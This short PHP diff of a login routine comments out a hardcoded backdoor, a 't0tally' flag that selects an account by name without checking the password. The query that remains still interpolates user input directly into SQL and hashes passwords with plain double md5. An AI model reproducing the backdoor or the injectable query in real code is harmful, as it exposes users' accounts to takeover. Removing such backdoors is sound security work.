@@ -75,10 +75,10 @@ if ($name != "")
 				$password = md5(md5($password));
 			}
 		}
-		if ($pre_md5 == "t0tally")
+		/*if ($pre_md5 == "t0tally")
 			$sql = "SELECT * FROM accounts WHERE login = '$name' AND locked = 0";
-		else
-			$sql = "SELECT * FROM " . db_prefix("accounts") . " WHERE login = '$name' AND password='$password' AND locked=0";
+		else*/
+		$sql = "SELECT * FROM " . db_prefix("accounts") . " WHERE login = '$name' AND password='$password' AND locked=0";
 		$result = db_query($sql);
 		if (db_num_rows($result) == 1)
 		{
